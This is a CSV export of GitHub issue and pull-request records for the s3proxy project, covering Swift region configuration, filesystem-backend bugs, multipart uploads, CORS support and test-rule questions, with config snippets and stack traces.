gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/295,417553309,MDExOlB1bGxSZXF1ZXN0MjU4NTI2MjM2,295,Fix for OVH swift storage (url mismatch for region),1161538,closed,FALSE,NA,NA,1,2019-03-05T23:39:13Z,2019-03-06T14:26:58Z,2019-03-06T14:26:43Z,CONTRIBUTOR,NA,"I've tried to use the proxy for OVH swift storage and got the same problem as #81 . The main problem was that `BlobStore blobStore = context.getBlobStore();` tries to compare different endpoints basing on values of the dictionary returned by the OVH API and the JCLOUDS_ENDPOINT variable. It mismatches hardly and it's falling back to the first region, that is DE1.

`[s3proxy] W 03-05 23:32:53.312 main o.j.l.s.i.GetRegionIdMatchingProviderURIOrNull:74 |::] failed to find key for value https://auth.cloud.ovh.net/v3/ in {DE1=https://storage.de1.cloud.ovh.net/v1/AUTH_d443, UK1=https://storage.uk1.cloud.ovh.net/v1/AUTH_d443, WAW1=https://storage.waw1.cloud.ovh.net/v1/AUTH_d443, GRA5=https://storage.gra5.cloud.ovh.net/v1/AUTH_d443, BHS3=https://storage.bhs3.cloud.ovh.net/v1/AUTH_d443, SBG5=https://storage.sbg5.cloud.ovh.net/v1/AUTH_d443}; choosing first: DE1
`

I've managed to tune the code a little bit and it happened to fix my problem, now I can define proper region in JCLOUDS_REGION variable. (JCLOUDS_REGIONS also has to be filled and has to contain the chosen region).
Also it seem that all tests are passing, therefore, here is the PR.
",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/295/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/295/comments,https://api.github.com/repos/gaul/s3proxy/issues/295/events,https://github.com/gaul/s3proxy/pull/295,https://api.github.com/repos/gaul/s3proxy/pulls/295
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/294,412317357,MDU6SXNzdWU0MTIzMTczNTc=,294,The specified bucket does not exist,23074312,open,FALSE,NA,NA,3,2019-02-20T09:08:33Z,2019-02-20T12:59:40Z,NA,NONE,NA,"I am using local file system as the storage backend, my conf file is wrote as the instruction: 
```
s3proxy.authorization=none
s3proxy.endpoint=http://***hidden***:9234
jclouds.provider=filesystem
jclouds.filesystem.basedir=/home/esimimo/
```
And I am using following command to run s3proxy(the latest version):
`nohup java -jar s3proxy --properties disk-simin.conf &`

But I found:

- when I use the folder which contains <= 2 characters as the bucket name, it will fail:

```
curl http://***hidden***:9234/ki/aaa
<?xml version='1.0' encoding='UTF-8'?><Error><Code>NoSuchBucket</Code><Message>The specified bucket does not exist</Message><RequestId>4442587FB7D0A2F9</RequestId></Error>
```

- When I use the folder which contains > 2 characters as the bucket name, it will be successful:

```
curl http://***hidden***:9234/temp/aaa
aaaaaa
```

Should this be a bug or I missed something? Thanks in advance!",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/294/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/294/comments,https://api.github.com/repos/gaul/s3proxy/issues/294/events,https://github.com/gaul/s3proxy/issues/294,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/293,408482750,MDExOlB1bGxSZXF1ZXN0MjUxNzA2MDky,293,Add partial support for list objects v2,848247,closed,FALSE,NA,NA,1,2019-02-09T23:37:13Z,2019-02-13T18:07:54Z,2019-02-13T18:06:40Z,OWNER,NA,"Not supporting `fetch-owner` until jclouds adds support for this.
Several applications like AWS CLI now require this RPC.",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/293/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/293/comments,https://api.github.com/repos/gaul/s3proxy/issues/293/events,https://github.com/gaul/s3proxy/pull/293,https://api.github.com/repos/gaul/s3proxy/pulls/293
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/292,396697071,MDU6SXNzdWUzOTY2OTcwNzE=,292,filesystem backend cannot complete large multipart uploads,848247,closed,FALSE,NA,NA,3,2019-01-07T23:58:18Z,2019-02-06T23:12:00Z,2019-02-06T23:12:00Z,OWNER,NA,"S3Proxy via jclouds filesystem implements multipart upload by first creating the parts as files then reading the parts sequentially and writing them to the destination file.  This incurs 3x IO and I observed S3 clients timing out when writing a 25 GB object.  Instead, I wonder if it could write to a single temporary file at the correct offsets then just rename to the destination file?",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/292/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/292/comments,https://api.github.com/repos/gaul/s3proxy/issues/292/events,https://github.com/gaul/s3proxy/issues/292,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/290,395264828,MDExOlB1bGxSZXF1ZXN0MjQxNzU5OTE0,290,Adding libraries removed in Java 11,452737,closed,FALSE,NA,NA,3,2019-01-02T14:28:58Z,2019-10-04T23:36:12Z,2019-10-04T23:36:12Z,NONE,NA,"Please see this SO answer for details: https://stackoverflow.com/a/43574427 
Adding these libraries allows to build s3proxy on Java8 and run it on Java11.
Without these libraries, I was unable to start s3proxy.",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/290/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/290/comments,https://api.github.com/repos/gaul/s3proxy/issues/290/events,https://github.com/gaul/s3proxy/pull/290,https://api.github.com/repos/gaul/s3proxy/pulls/290
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/289,395228997,MDU6SXNzdWUzOTUyMjg5OTc=,289, Implement bucket location response,6539656,open,FALSE,NA,NA,3,2019-01-02T12:08:45Z,2019-01-03T19:01:11Z,NA,NONE,NA,"`s3api get-bucket-location` command returns `null` even if LocationConstraint is provided during the bucket creation:
```
> docker run  -p 9090:80 -e S3PROXY_AUTHORIZATION=none  andrewgaul/s3proxy:latest
...
> aws s3api create-bucket --bucket my-bucket3 --create-bucket-configuration LocationConstraint=us-east-1   --endpoint-url http://localhost:9090
{
    ""Location"": ""/my-bucket3""
}

> aws s3api get-bucket-location --bucket my-bucket3 --endpoint-url http://localhost:9090 
{
    ""LocationConstraint"": null
}
```
Do you have plans to implement the functionality?
Is there any possibility to provide a default region?",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/289/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/289/comments,https://api.github.com/repos/gaul/s3proxy/issues/289/events,https://github.com/gaul/s3proxy/issues/289,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/288,389736077,MDU6SXNzdWUzODk3MzYwNzc=,288,Junit5: support jupiter engine,2169655,open,FALSE,NA,NA,3,2018-12-11T12:13:54Z,2018-12-13T14:34:41Z,NA,NONE,NA,"Are there plans to support `junit5` via the extension mechanism? Do you need support (I might be able to help, though I did not yet looked into details)",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/288/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/288/comments,https://api.github.com/repos/gaul/s3proxy/issues/288/events,https://github.com/gaul/s3proxy/issues/288,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/287,380726338,MDExOlB1bGxSZXF1ZXN0MjMwODU3MTc4,287,Basic CORS support ,10754110,closed,FALSE,NA,NA,6,2018-11-14T14:35:10Z,2018-12-31T13:48:50Z,2018-12-21T22:19:51Z,CONTRIBUTOR,NA,"This PR brings the basic capability for `s3proxy` to respond to CORS preflight requests.

* S3ProxyHandler for HTTP method `OPTIONS`
* `OPTIONS` response include `Access-Control-Allow-Origin`, `Access-Control-Allow-Methods` and `Access-Control-Allow-Headers` Headers
* Rewrite `method` in signature generation for `OPTIONS` requests
* Configurability for allowed Origins, Methods and Headers for CORS Preflight requests
* Adding `Access-Control-Allow-Origin` header in CORS actual requests for GET, POST and PUT method based on provided `Origin` header
* `S3PROXY_CORS_ALLOW_ALL` allows every Origin and Header and Methods `GET, PUT, POST`

Allowed CORS settings with regex for Origins looks like:
```
docker run --publish 8888:80 \
   -e S3PROXY_... \
   -e S3PROXY_CORS_ALLOW_ORIGINS=""https://.+\.example\.com https://.+\.example\.cloud http://localhost:.+"" \
   -e S3PROXY_CORS_ALLOW_METHODS=""GET PUT"" \
   -e S3PROXY_CORS_ALLOW_HEADERS=""Content-Type Accept"" \
   -e JCLOUDS_... \
   --name s3proxy gaul/s3proxy:latest
```

This does not add support for S3 CORS bucket operations as such.

fixes #142 ",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/287/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/287/comments,https://api.github.com/repos/gaul/s3proxy/issues/287/events,https://github.com/gaul/s3proxy/pull/287,https://api.github.com/repos/gaul/s3proxy/pulls/287
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/286,380600387,MDExOlB1bGxSZXF1ZXN0MjMwNzU4ODIw,286,Keystone v3 support with properties,10754110,closed,FALSE,NA,NA,1,2018-11-14T09:10:13Z,2018-12-31T13:48:53Z,2018-11-14T20:49:27Z,CONTRIBUTOR,NA,"As already documented in the Wiki https://github.com/gaul/s3proxy/wiki/Storage-backend-examples#swift-keystone-v30, you can use a Swift backend with Keystone v3 authentification.
This PR makes the needed `jcloud` configuration options available in the Dockerfile and pass the environment as properties to the java runtime.",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/286/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/286/comments,https://api.github.com/repos/gaul/s3proxy/issues/286/events,https://github.com/gaul/s3proxy/pull/286,https://api.github.com/repos/gaul/s3proxy/pulls/286
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/285,372851864,MDU6SXNzdWUzNzI4NTE4NjQ=,285,Expected hash not equal to calculated hash,16554094,open,FALSE,NA,NA,6,2018-10-23T07:41:21Z,2019-09-06T18:22:34Z,NA,NONE,NA,"Getting error ""Expected hash not equal to calculated hash"" at Amazon.S3.Internal.AmazonS3ResponseHandler.CompareHashes(String etag, Byte[] hash)

Getting this error for PutObjectAsync method call",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/285/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/285/comments,https://api.github.com/repos/gaul/s3proxy/issues/285/events,https://github.com/gaul/s3proxy/issues/285,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/284,367830196,MDU6SXNzdWUzNjc4MzAxOTY=,284,Wiki example for swift unclear,47808,closed,FALSE,NA,NA,1,2018-10-08T14:57:53Z,2018-12-19T05:09:19Z,2018-12-19T05:09:19Z,NONE,NA,"
The [wiki entry describing keystone authentication](https://github.com/gaul/s3proxy/wiki/Storage-backend-examples#swift-keystone-v20)   suggests the following configuration

```

docker run --rm -t -i --publish 80:80  \
  -e S3PROXY_AUTHORIZATION=none \
  -e JCLOUDS_PROVIDER=openstack-swift \
  -e JCLOUDS_ENDPOINT=$OS_AUTH_URL \
  -e JCLOUDS_REGION=$OS_REGION_NAME \
  -e JCLOUDS_IDENTITY=$OS_TENANT_NAME:$OS_USERNAME \
  -e JCLOUDS_CREDENTIAL=$OS_PASSWORD \
  --name s3proxy andrewgaul/s3proxy

```

This produced the following exception.

```
[s3proxy] W 10-08 14:55:31.931 main o.j.l.s.i.GetRegionIdMatchingProviderURIOrNull:74 |::] failed to find key for value http://10.96.11.20:5000/v2.0 in {RegionOne=http://10.96.11.20:8080/v1/AUTH_8897b62d8a8d45f38dfd2530375fbdac}; choosing first: RegionOne
Exception in thread ""main"" java.lang.IllegalArgumentException: region RegionOne not in []
	at com.google.common.base.Preconditions.checkArgument(Preconditions.java:145)
	at org.jclouds.openstack.swift.v1.blobstore.RegionScopedBlobStoreContext.checkRegionId(RegionScopedBlobStoreContext.java:88)
	at org.jclouds.openstack.swift.v1.blobstore.RegionScopedBlobStoreContext.getBlobStore(RegionScopedBlobStoreContext.java:72)
	at org.jclouds.openstack.swift.v1.blobstore.RegionScopedBlobStoreContext.getBlobStore(RegionScopedBlobStoreContext.java:122)
	at org.gaul.s3proxy.Main.createBlobStore(Main.java:313)
	at org.gaul.s3proxy.Main.main(Main.java:112)
```


After some trial and error, I discovered that setting the JCLOUDS_REGIONS variable worked


```
docker run --rm -t -i --publish 80:80  \
  -e S3PROXY_AUTHORIZATION=none \
  -e JCLOUDS_PROVIDER=openstack-swift \
  -e JCLOUDS_ENDPOINT=$OS_AUTH_URL \
  -e JCLOUDS_REGIONS=$OS_REGION_NAME \
  -e JCLOUDS_REGION=$OS_REGION_NAME \
  -e JCLOUDS_IDENTITY=$OS_TENANT_NAME:$OS_USERNAME \
  -e JCLOUDS_CREDENTIAL=$OS_PASSWORD \
  --name s3proxy andrewgaul/s3proxy


[s3proxy] W 10-08 14:57:05.277 main o.j.l.s.i.GetRegionIdMatchingProviderURIOrNull:74 |::] failed to find key for value http://10.96.11.20:5000/v2.0 in {RegionOne=http://10.96.11.20:8080/v1/AUTH_8897b62d8a8d45f38dfd2530375fbdac}; choosing first: RegionOne
[s3proxy] I 10-08 14:57:05.349 main o.g.s.o.eclipse.jetty.util.log:186 |::] Logging initialized @2134ms
[s3proxy] I 10-08 14:57:05.430 main o.g.s.o.e.jetty.server.Server:327 |::] jetty-9.2.z-SNAPSHOT
[s3proxy] I 10-08 14:57:05.467 main o.g.s.o.e.j.s.ServerConnector:266 |::] Started ServerConnector@526cbe2d{HTTP/1.1}{0.0.0.0:80}
[s3proxy] I 10-08 14:57:05.468 main o.g.s.o.e.jetty.server.Server:379 |::] Started @2255ms
```


",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/284/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/284/comments,https://api.github.com/repos/gaul/s3proxy/issues/284/events,https://github.com/gaul/s3proxy/issues/284,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/283,364611151,MDU6SXNzdWUzNjQ2MTExNTE=,283,Bandwidth limiting middleware,848247,open,FALSE,NA,NA,0,2018-09-27T19:00:17Z,2018-09-27T19:00:17Z,NA,OWNER,NA,"Simulate slower writes, reads, server-side copies, etc.",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/283/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/283/comments,https://api.github.com/repos/gaul/s3proxy/issues/283/events,https://github.com/gaul/s3proxy/issues/283,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/282,358922207,MDU6SXNzdWUzNTg5MjIyMDc=,282,Objects Key inconsistency ,40227067,open,FALSE,NA,NA,1,2018-09-11T07:32:19Z,2019-01-04T05:31:18Z,NA,NONE,NA,"If you create a folder in actual S3 with name ""test"". The key would be ""test/"". 

But in case of S3 proxy the slash in key changes based on OS . like for windows it gives ""test\\"" while on
Linux it gives ""test/"".  I understand that, it is due to the difference of path style in windows and Linux.

It would be better if it always returns OS neutral keys(as returned by Actual AWS instance.)

Note:
1.  when you have a file ""file.txt"" inside the ""test"" folder, then key for file.txt has no issues, however key for ""test"" folder alone is not accurate.",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/282/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/282/comments,https://api.github.com/repos/gaul/s3proxy/issues/282/events,https://github.com/gaul/s3proxy/issues/282,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/281,355131304,MDU6SXNzdWUzNTUxMzEzMDQ=,281,Can we use S3ProxyRule in cucumber test ,40227067,open,FALSE,NA,NA,13,2018-08-29T12:12:25Z,2019-01-04T20:16:31Z,NA,NONE,NA,"I have used S3ProxyRule  in junit testing. But while using it (similar way as used in junit) cucumber code , the s3 proxy jetty server doesn't get started hence the endpoint is null. ",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/281/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/281/comments,https://api.github.com/repos/gaul/s3proxy/issues/281/events,https://github.com/gaul/s3proxy/issues/281,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/280,343571864,MDExOlB1bGxSZXF1ZXN0MjAzMTcxOTk0,280,Update README.md,4161347,closed,FALSE,NA,NA,5,2018-07-23T10:16:17Z,2018-12-21T22:23:39Z,2018-12-21T22:23:39Z,NONE,NA,updated required java version to java 8,NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/280/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/280/comments,https://api.github.com/repos/gaul/s3proxy/issues/280/events,https://github.com/gaul/s3proxy/pull/280,https://api.github.com/repos/gaul/s3proxy/pulls/280
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/279,342724597,MDU6SXNzdWUzNDI3MjQ1OTc=,279,"listObjects() failed by ""Unable to get list of extended attributes: Operation not supported""",1237695,closed,FALSE,NA,NA,4,2018-07-19T13:19:03Z,2019-01-04T20:15:23Z,2019-01-04T20:14:32Z,NONE,NA,"Hi,
I run s3proxy in a Linux server.
The basedir is ""/home/awss3/s3test"", then I create sub-folder ""folder"".
But I can't list the object ""/home/awss3/s3test/folder"" by AWS S3 API. 
I'm not sure if it is caused by a FS without the extended attributes (i.e. user_xattr). Or some other reasons ?

Java code:
```java
ListObjectsRequest listObjectsRequest = new ListObjectsRequest().withBucketName(""s3test"").withPrefix(""folder"");
ObjectListing results=s3.listObjects(listObjectsRequest);
```


Error log:
```
2018-07-19 12:44:18.815 ERROR 26154 --- [nio-8080-exec-2] o.a.c.c.C.[.[.[/].[dispatcherServlet]    : Servlet.service() for servlet [dispatcherServlet] in context with path [] threw exception 
[Request processing failed; nested exception is com.amazonaws.services.s3.model.AmazonS3Exception: java.nio.file.FileSystemException: /home/awss3/s3test/folder: Unable to get list of extended attributes: Operation not supported (Service: Amazon S3; Status Code: 500; Error Code: 500 java.nio.file.FileSystemException: /home/awss3/s3test/folder: Unable to get list of extended attributes: Operation not supported; Request ID: null), S3 Extended Request ID: null] with root cause

com.amazonaws.services.s3.model.AmazonS3Exception: java.nio.file.FileSystemException: /home/awss3/s3test/folder: Unable to get list of extended attributes: Operation not supported (Service: Amazon S3; Status Code: 500; Error Code: 500 java.nio.file.FileSystemException: /home/awss3/s3test/folder: Unable to get list of extended attributes: Operation not supported; Request ID: null)
	at com.amazonaws.http.AmazonHttpClient$RequestExecutor.handleErrorResponse(AmazonHttpClient.java:1588) ~[aws-java-sdk-core-1.11.125.jar:na]
	at com.amazonaws.http.AmazonHttpClient$RequestExecutor.executeOneRequest(AmazonHttpClient.java:1258) ~[aws-java-sdk-core-1.11.125.jar:na]
	at com.amazonaws.http.AmazonHttpClient$RequestExecutor.executeHelper(AmazonHttpClient.java:1030) ~[aws-java-sdk-core-1.11.125.jar:na]
	at com.amazonaws.http.AmazonHttpClient$RequestExecutor.doExecute(AmazonHttpClient.java:742) ~[aws-java-sdk-core-1.11.125.jar:na]
	at com.amazonaws.http.AmazonHttpClient$RequestExecutor.executeWithTimer(AmazonHttpClient.java:716) ~[aws-java-sdk-core-1.11.125.jar:na]
	at com.amazonaws.http.AmazonHttpClient$RequestExecutor.execute(AmazonHttpClient.java:699) ~[aws-java-sdk-core-1.11.125.jar:na]
	at com.amazonaws.http.AmazonHttpClient$RequestExecutor.access$500(AmazonHttpClient.java:667) ~[aws-java-sdk-core-1.11.125.jar:na]
	at com.amazonaws.http.AmazonHttpClient$RequestExecutionBuilderImpl.execute(AmazonHttpClient.java:649) ~[aws-java-sdk-core-1.11.125.jar:na]
	at com.amazonaws.http.AmazonHttpClient.execute(AmazonHttpClient.java:513) ~[aws-java-sdk-core-1.11.125.jar:na]
	at com.amazonaws.services.s3.AmazonS3Client.invoke(AmazonS3Client.java:4169) ~[aws-java-sdk-s3-1.11.125.jar:na]
	at com.amazonaws.services.s3.AmazonS3Client.invoke(AmazonS3Client.java:4116) ~[aws-java-sdk-s3-1.11.125.jar:na]
	at com.amazonaws.services.s3.AmazonS3Client.invoke(AmazonS3Client.java:4110) ~[aws-java-sdk-s3-1.11.125.jar:na]
	at com.amazonaws.services.s3.AmazonS3Client.listObjects(AmazonS3Client.java:819) ~[aws-java-sdk-s3-1.11.125.jar:na]
...


[s3proxy] E 07-19 12:44:18.772 S3Proxy-17 o.j.f.s.i.FilesystemStorageStrategyImpl:93 |::] An error occurred while checking key s3test in container folder/
java.nio.file.FileSystemException: /home/awss3/s3test/folder: Unable to get list of extended attributes: Operation not supported
        at sun.nio.fs.LinuxUserDefinedFileAttributeView.list(LinuxUserDefinedFileAttributeView.java:121)
        at org.jclouds.filesystem.strategy.internal.FilesystemStorageStrategyImpl.buildPathAndChecksIfBlobExists(FilesystemStorageStrategyImpl.java:693)
        at org.jclouds.filesystem.strategy.internal.FilesystemStorageStrategyImpl.blobExists(FilesystemStorageStrategyImpl.java:288)
        at org.jclouds.blobstore.config.LocalBlobStore$1.apply(LocalBlobStore.java:246)
        at org.jclouds.blobstore.config.LocalBlobStore$1.apply(LocalBlobStore.java:242)
        at com.google.common.collect.Iterators$7.computeNext(Iterators.java:647)
        at com.google.common.collect.AbstractIterator.tryToComputeNext(AbstractIterator.java:143)
        at com.google.common.collect.AbstractIterator.hasNext(AbstractIterator.java:138)
        at com.google.common.collect.TransformedIterator.hasNext(TransformedIterator.java:43)
        at com.google.common.collect.Iterators$7.computeNext(Iterators.java:645)
        at com.google.common.collect.AbstractIterator.tryToComputeNext(AbstractIterator.java:143)
        at com.google.common.collect.AbstractIterator.hasNext(AbstractIterator.java:138)
        at com.google.common.collect.Iterators.addAll(Iterators.java:356)
        at com.google.common.collect.Iterables.addAll(Iterables.java:350)
        at com.google.common.collect.Sets.newTreeSet(Sets.java:365)
        at org.jclouds.blobstore.config.LocalBlobStore.list(LocalBlobStore.java:249)
        at sun.reflect.GeneratedMethodAccessor5.invoke(Unknown Source)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
        at java.lang.reflect.Method.invoke(Method.java:498)
        at com.google.inject.internal.DelegatingInvocationHandler.invoke(DelegatingInvocationHandler.java:37)
        at com.sun.proxy.$Proxy40.list(Unknown Source)
        at org.gaul.s3proxy.S3ProxyHandler.handleBlobList(S3ProxyHandler.java:1239)
        at org.gaul.s3proxy.S3ProxyHandler.doHandle(S3ProxyHandler.java:584)
        at org.gaul.s3proxy.S3ProxyHandlerJetty.handle(S3ProxyHandlerJetty.java:70)
        at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:97)
        at org.eclipse.jetty.server.Server.handle(Server.java:499)
        at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:311)
        at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:258)
        at org.eclipse.jetty.io.AbstractConnection$2.run(AbstractConnection.java:544)
        at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:635)
        at org.eclipse.jetty.util.thread.QueuedThreadPool$3.run(QueuedThreadPool.java:555)
        at java.lang.Thread.run(Thread.java:745)
[s3proxy] W 07-19 12:44:18.772 S3Proxy-17 o.e.jetty.server.HttpChannel:396 |::] /s3test/?prefix=folder&delimiter=%2F&encoding-type=url
java.lang.RuntimeException: java.nio.file.FileSystemException: /home/awss3/s3test/folder: Unable to get list of extended attributes: Operation not supported
        at com.google.common.base.Throwables.propagate(Throwables.java:160)
        at org.jclouds.filesystem.strategy.internal.FilesystemStorageStrategyImpl.blobExists(FilesystemStorageStrategyImpl.java:292)
        at org.jclouds.blobstore.config.LocalBlobStore$1.apply(LocalBlobStore.java:246)
        at org.jclouds.blobstore.config.LocalBlobStore$1.apply(LocalBlobStore.java:242)
        at com.google.common.collect.Iterators$7.computeNext(Iterators.java:647)
        at com.google.common.collect.AbstractIterator.tryToComputeNext(AbstractIterator.java:143)
        at com.google.common.collect.AbstractIterator.hasNext(AbstractIterator.java:138)
        at com.google.common.collect.TransformedIterator.hasNext(TransformedIterator.java:43)
        at com.google.common.collect.Iterators$7.computeNext(Iterators.java:645)
        at com.google.common.collect.AbstractIterator.tryToComputeNext(AbstractIterator.java:143)
        at com.google.common.collect.AbstractIterator.hasNext(AbstractIterator.java:138)
        at com.google.common.collect.Iterators.addAll(Iterators.java:356)
        at com.google.common.collect.Iterables.addAll(Iterables.java:350)
        at com.google.common.collect.Sets.newTreeSet(Sets.java:365)
        at org.jclouds.blobstore.config.LocalBlobStore.list(LocalBlobStore.java:249)
        at sun.reflect.GeneratedMethodAccessor5.invoke(Unknown Source)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
        at java.lang.reflect.Method.invoke(Method.java:498)
        at com.google.inject.internal.DelegatingInvocationHandler.invoke(DelegatingInvocationHandler.java:37)
        at com.sun.proxy.$Proxy40.list(Unknown Source)
        at org.gaul.s3proxy.S3ProxyHandler.handleBlobList(S3ProxyHandler.java:1239)
        at org.gaul.s3proxy.S3ProxyHandler.doHandle(S3ProxyHandler.java:584)
        at org.gaul.s3proxy.S3ProxyHandlerJetty.handle(S3ProxyHandlerJetty.java:70)
        at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:97)
        at org.eclipse.jetty.server.Server.handle(Server.java:499)
        at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:311)
        at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:258)
        at org.eclipse.jetty.io.AbstractConnection$2.run(AbstractConnection.java:544)
        at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:635)
        at org.eclipse.jetty.util.thread.QueuedThreadPool$3.run(QueuedThreadPool.java:555)
        at java.lang.Thread.run(Thread.java:745)
Caused by: java.nio.file.FileSystemException: /home/awss3/s3test/folder: Unable to get list of extended attributes: Operation not supported
        at sun.nio.fs.LinuxUserDefinedFileAttributeView.list(LinuxUserDefinedFileAttributeView.java:121)
        at org.jclouds.filesystem.strategy.internal.FilesystemStorageStrategyImpl.buildPathAndChecksIfBlobExists(FilesystemStorageStrategyImpl.java:693)
        at org.jclouds.filesystem.strategy.internal.FilesystemStorageStrategyImpl.blobExists(FilesystemStorageStrategyImpl.java:288)
        ... 29 common frames omitted
```

BR/Jasper",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/279/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/279/comments,https://api.github.com/repos/gaul/s3proxy/issues/279/events,https://github.com/gaul/s3proxy/issues/279,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/278,333197430,MDU6SXNzdWUzMzMxOTc0MzA=,278,S3ProxyRule - The AWS access key Id you provided does not exist in our records.,40227067,closed,FALSE,NA,NA,4,2018-06-18T09:36:02Z,2020-04-03T19:42:00Z,2019-01-04T20:17:56Z,NONE,NA,"As provided in sample :

```java
AmazonS3 s3Client = AmazonS3ClientBuilder
            .standard()
            .withCredentials(
              new AWSStaticCredentialsProvider(
                new BasicAWSCredentials(s3Proxy.getAccessKey(), 
                                        s3Proxy.getSecretKey())))
            .withEndpointConfiguration(
              new EndpointConfiguration(s3Proxy.getUri().toString(), 
                                        Regions.US_EAST_1.getName()))
            .build();
```

Rather than this , i am creating client using the below snippet(this is how my code client is defined):

```java
 AmazonS3 s3Client = AmazonS3ClientBuilder
    	            .standard()
    	            .withCredentials(
    	              new AWSStaticCredentialsProvider(
    	                new BasicAWSCredentials(S3_PROXY_RULE.getAccessKey(), 
    	                		S3_PROXY_RULE.getSecretKey())))
    	            .withRegion(""us-east-1"")
    	            .build();
```

In this case its throwing the exception AmazonS3Exception with the message ""The AWS access key Id you provided does not exist in our records.""",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/278/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/278/comments,https://api.github.com/repos/gaul/s3proxy/issues/278/events,https://github.com/gaul/s3proxy/issues/278,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/277,327469570,MDExOlB1bGxSZXF1ZXN0MTkxMjU2NjI0,277,Allow setting property jclouds.regions via env variables when running in docker,3725458,closed,FALSE,NA,NA,1,2018-05-29T20:10:26Z,2018-08-02T00:31:30Z,2018-08-02T00:31:19Z,CONTRIBUTOR,NA,"Also, default to`jcloud.regions=us-east-1` to avoid issues with the nodejs aws sdk like the one described in #202.",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/277/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/277/comments,https://api.github.com/repos/gaul/s3proxy/issues/277/events,https://github.com/gaul/s3proxy/pull/277,https://api.github.com/repos/gaul/s3proxy/pulls/277
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/276,325098847,MDU6SXNzdWUzMjUwOTg4NDc=,276,Middleware to model Glacier thawing time,848247,open,FALSE,NA,NA,0,2018-05-22T00:09:31Z,2018-05-22T00:09:31Z,NA,OWNER,NA,"Presently S3Proxy allows changing the storage class to and from Glacier.  For the latter, a middleware could mimic the 3-5 hour latency, configurable via properties.",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/276/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/276/comments,https://api.github.com/repos/gaul/s3proxy/issues/276/events,https://github.com/gaul/s3proxy/issues/276,NA
